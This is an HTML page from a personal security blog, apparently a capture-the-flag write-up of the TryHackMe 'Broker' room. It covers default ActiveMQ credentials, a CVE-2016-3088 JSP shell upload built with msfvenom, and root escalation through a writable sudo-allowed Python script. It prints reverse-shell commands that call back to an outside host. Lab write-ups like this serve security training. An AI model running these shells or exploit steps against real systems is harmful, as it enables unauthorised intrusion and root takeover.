@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Language" content="en">
+    <meta name="color-scheme" content="light dark">
+
+    
+
+    <meta name="author" content="monoloc0">
+    <meta name="description" content="https://tryhackme.com/room/broker
+Enumeration    Port Scan     pre code { background-color: #eee; }  # Nmap 7.80 scan initiated Wed Mar 10 21:41:24 2021 as: nmap -sC -sV -p- -oA nmap/output broker.thm Nmap scan report for broker.thm (10.10.126.18) Host is up (0.080s latency). Not shown: 65531 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 4c:75:a0:7b:43:87:70:4f:70:16:d2:3c:c4:c5:a4:e9 (RSA) | 256 f4:62:b2:ad:f8:62:a0:91:2f:0a:0e:29:1a:db:70:e4 (ECDSA) |_ 256 92:d2:87:7b:98:12:45:93:52:03:5e:9e:c7:18:71:d5 (ED25519) 1883/tcp open mqtt?">
+    <meta name="keywords" content="infosec,bugbounty,personal">
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Broker"/>
+<meta name="twitter:description" content="https://tryhackme.com/room/broker
+Enumeration    Port Scan     pre code { background-color: #eee; }  # Nmap 7.80 scan initiated Wed Mar 10 21:41:24 2021 as: nmap -sC -sV -p- -oA nmap/output broker.thm Nmap scan report for broker.thm (10.10.126.18) Host is up (0.080s latency). Not shown: 65531 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 4c:75:a0:7b:43:87:70:4f:70:16:d2:3c:c4:c5:a4:e9 (RSA) | 256 f4:62:b2:ad:f8:62:a0:91:2f:0a:0e:29:1a:db:70:e4 (ECDSA) |_ 256 92:d2:87:7b:98:12:45:93:52:03:5e:9e:c7:18:71:d5 (ED25519) 1883/tcp open mqtt?"/>
+
+    <meta property="og:title" content="Broker" />
+<meta property="og:description" content="https://tryhackme.com/room/broker
+Enumeration    Port Scan     pre code { background-color: #eee; }  # Nmap 7.80 scan initiated Wed Mar 10 21:41:24 2021 as: nmap -sC -sV -p- -oA nmap/output broker.thm Nmap scan report for broker.thm (10.10.126.18) Host is up (0.080s latency). Not shown: 65531 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 4c:75:a0:7b:43:87:70:4f:70:16:d2:3c:c4:c5:a4:e9 (RSA) | 256 f4:62:b2:ad:f8:62:a0:91:2f:0a:0e:29:1a:db:70:e4 (ECDSA) |_ 256 92:d2:87:7b:98:12:45:93:52:03:5e:9e:c7:18:71:d5 (ED25519) 1883/tcp open mqtt?" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://monoloc0.github.io/broker/" /><meta property="article:section" content="" />
+
+
+
+
+
+    <title>
+  Broker · monoloc0
+</title>
+
+    
+      <link rel="canonical" href="https://monoloc0.github.io/broker/">
+    
+
+    <link rel="preload" href="https://monoloc0.github.io/fonts/forkawesome-webfont.woff2?v=1.2.0" as="font" type="font/woff2" crossorigin>
+
+    
+      
+      
+      <link rel="stylesheet" href="https://monoloc0.github.io/css/coder.min.843ee18d510f7cb1bb49110db117b99ea65489c095d620a5d79ea71693478e77.css" integrity="sha256-hD7hjVEPfLG7SRENsRe5nqZUicCV1iCl156nFpNHjnc=" crossorigin="anonymous" media="screen" />
+    
+
+    
+
+    
+
+    
+
+    
+
+    <link rel="icon" type="image/png" href="https://monoloc0.github.io/images/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="https://monoloc0.github.io/images/favicon-16x16.png" sizes="16x16">
+
+    <link rel="apple-touch-icon" href="https://monoloc0.github.io/images/apple-touch-icon.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://monoloc0.github.io/images/apple-touch-icon.png">
+
+    <meta name="generator" content="Hugo 0.89.4" />
+  </head>
+
+  
+  
+  <body class="preload-transitions colorscheme-light">
+    
+
+    <main class="wrapper">
+      <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="https://monoloc0.github.io/">
+      monoloc0
+    </a>
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="https://monoloc0.github.io/whoami/">whoami</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="https://monoloc0.github.io/writeups/">writeups</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="https://monoloc0.github.io/resources/">resources</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+      <div class="content">
+        
+  <section class="container page">
+  <article>
+    <header>
+      <h1 class="title">
+        <a class="title-link" href="https://monoloc0.github.io/broker/">
+          Broker
+        </a>
+      </h1>
+    </header>
+
+    <p><em><a href="https://tryhackme.com/room/broker">https://tryhackme.com/room/broker</a></em></p>
+<h1 id="enumeration">
+  Enumeration
+  <a class="heading-link" href="#enumeration">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h1>
+<h2 id="port-scan">
+  Port Scan
+  <a class="heading-link" href="#port-scan">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<style>
+
+
+pre code {
+  background-color: #eee;
+
+}
+
+
+</style>
+
+<pre tabindex="0"><code># Nmap 7.80 scan initiated Wed Mar 10 21:41:24 2021 as: nmap -sC -sV -p- -oA nmap/output broker.thm
+Nmap scan report for broker.thm (10.10.126.18)
+Host is up (0.080s latency).
+Not shown: 65531 closed ports
+PORT      STATE SERVICE    VERSION
+22/tcp    open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 4c:75:a0:7b:43:87:70:4f:70:16:d2:3c:c4:c5:a4:e9 (RSA)
+|   256 f4:62:b2:ad:f8:62:a0:91:2f:0a:0e:29:1a:db:70:e4 (ECDSA)
+|_  256 92:d2:87:7b:98:12:45:93:52:03:5e:9e:c7:18:71:d5 (ED25519)
+1883/tcp  open  mqtt?
+8161/tcp  open  http       Jetty 7.6.9.v20130131
+|_http-server-header: Jetty(7.6.9.v20130131)
+|_http-title: Apache ActiveMQ
+38979/tcp open  tcpwrapped
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed Mar 10 21:43:33 2021 -- 1 IP address (1 host up) scanned in 129.45 seconds
+</code></pre><p>Browsing to http://&lt;IP_OF_BROKER&gt;/admin</p>
+<ul>
+<li>admin:admin works :)</li>
+</ul>
+<p>Installed mqtt.fx to be able to talk to port <strong>1883</strong> (mqtt) and eavesdrop the conversation between Paul and Max</p>
+<p><img src="../../_resources/dd92d75d7105467983b4267e1e8e45ae.png" alt="78654dfc4b5aff5536cdba21f74c1f2b.png"></p>
+<h1 id="uploading-shell">
+  Uploading Shell
+  <a class="heading-link" href="#uploading-shell">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h1>
+<p><strong>Source:</strong> <a href="https://medium.com/@knownsec404team/analysis-of-apache-activemq-remote-code-execution-vulnerability-cve-2016-3088-575f80924f30">https://medium.com/@knownsec404team/analysis-of-apache-activemq-remote-code-execution-vulnerability-cve-2016-3088-575f80924f30</a></p>
+<ul>
+<li>
+<p>Get File Path
+<img src="../../_resources/56d321d0e9d04d3090f03241b9eda70e.png" alt="0e45879c4f1922b5a12d976bf86015f6.png"></p>
+</li>
+<li>
+<p>Create Shell</p>
+<pre tabindex="0"><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.9.4.238 LPORT=4444 -f raw &gt; shell.jsp
+
+</code></pre><pre tabindex="0"><code></code></pre></li>
+<li>
+<p>Upload Shell</p>
+</li>
+</ul>
+<p><img src="../../_resources/4b16ed30ad9a4ec69941e37fec3e067f.png" alt="3b4d51e1e86736f0313771d4af6783ee.png"></p>
+<ul>
+<li>Move Shell to directory where it can be executed</li>
+</ul>
+<p><img src="../../_resources/96a5b67af8f544e5a3a3dfdb8ba2a2d2.png" alt="6f9b09950c08f1e816b6e18eb3e53bce.png"></p>
+<ul>
+<li>Catch Reverse Shell</li>
+</ul>
+<p><img src="../../_resources/d2b195d99bf943c0a866b1aad992cc8a.png" alt="ba17b29798aef265feed9c575a7f20d7.png"></p>
+<ul>
+<li>Get 1st Flag
+<img src="../../_resources/ae4123d257694919974ef38a141b3542.png" alt="a4253088b7cf06b8f699241e2a62aedc.png"></li>
+</ul>
+<h1 id="privilege-escalation">
+  Privilege Escalation
+  <a class="heading-link" href="#privilege-escalation">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h1>
+<h2 id="enumeration-1">
+  Enumeration
+  <a class="heading-link" href="#enumeration-1">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<p>My all-time favorite <code>sudo -l</code></p>
+<pre tabindex="0"><code>activemq@activemq:/opt/apache-activemq-5.9.0$ sudo -l
+Matching Defaults entries for activemq on activemq:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User activemq may run the following commands on activemq:
+    (root) NOPASSWD: /usr/bin/python3.7 /opt/apache-activemq-5.9.0/subscribe.py
+
+</code></pre><p>It seems like we can execute subscribe.py <strong>as root.</strong> Nice.</p>
+<p>And we even have <strong>write access</strong> on subscribe.py</p>
+<p><img src="../../_resources/b4a3d14b96f640cb91e7f138fe57fd22.png" alt="06d8c4d2b450b2d9a8b9bb62ec599d57.png"></p>
+<p>So,we just put a python reverse shell in there:</p>
+<pre tabindex="0"><code>import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.9.4.238&quot;,4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)
+</code></pre><p>run the python script with <strong>sudo</strong></p>
+<pre tabindex="0"><code>activemq@activemq:/opt/apache-activemq-5.9.0$ sudo /usr/bin/python3.7 /opt/apache-activemq-5.9.0/subscribe.py
+
+</code></pre><p>and catch a shell ;)</p>
+<p><img src="../../_resources/ffa1f57f2885494e9a2661ed21563676.png" alt="ba42c7e304efeb5089d7f625f0e9b40b.png"></p>
+
+  </article>
+</section>
+
+  
+
+      </div>
+
+      <footer class="footer">
+  <section class="container">
+    ©
+    
+    2021
+     monoloc0 
+    ·
+    Powered by <a href="https://gohugo.io/">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/">Coder</a>.
+    
+  </section>
+</footer>
+
+    </main>
+
+    
+      
+      <script src="https://monoloc0.github.io/js/coder.min.03b17769f4f91ae35667e1f2a1ca8c16f50562576cf90ff32b3179926914daa5.js" integrity="sha256-A7F3afT5GuNWZ&#43;HyocqMFvUFYlds&#43;Q/zKzF5kmkU2qU="></script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+  </body>
+
+</html>
